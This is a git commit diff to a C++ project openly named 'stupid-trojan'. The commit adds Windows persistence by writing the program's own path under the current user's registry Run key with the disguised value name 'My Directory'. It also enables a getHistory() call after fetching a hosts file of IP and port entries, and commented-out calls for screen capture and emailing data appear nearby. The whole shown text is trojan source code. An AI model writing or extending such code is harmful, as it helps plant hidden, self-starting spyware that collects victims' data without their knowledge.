3ecc9b07157663a4f9761c1d983b05510a18bc79
LiuzhouChan <llz.chann@gmail.com>
2016-12-14 16:54:49 +0800

    add the function of auto start when windows start

--- stupid-trojan/stupid-trojan.cpp
+++ stupid-trojan/stupid-trojan.cpp
@@ -1,20 +1,29 @@
 //do not show the cmd windows
-#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #include "util.h"
 #include<typeinfo>
 #include<stdio.h>
 #include<stdlib.h>
 #include<string>
 
-#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
+//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 
 
 
 int main()
 {
 	//copy();
+	HKEY hkey;
+	LPCTSTR lpRun = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+	RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_WRITE, &hkey);
+	TCHAR filename[MAX_PATH + 1];
+	DWORD len = GetModuleFileName(NULL, filename, MAX_PATH);
+	filename[len] = 0;
+	RegSetValueEx(hkey, L"My Directory", 0, REG_SZ,(const BYTE *)filename , (len+1)*sizeof(TCHAR));
+	RegCloseKey(hkey);
+
 	//ScreenCapture("asd.jpg");
-	//getHistory();
+
 	//list<string> l;
 	//sendemail(l);
 	for(int i=0;i<10;++i)
@@ -22,6 +31,7 @@ int main()
 		if(get_host_file())
 			break;
 	}
+	getHistory();
 	ifstream infile("hosts.txt");
 	string ip;
 	string port;
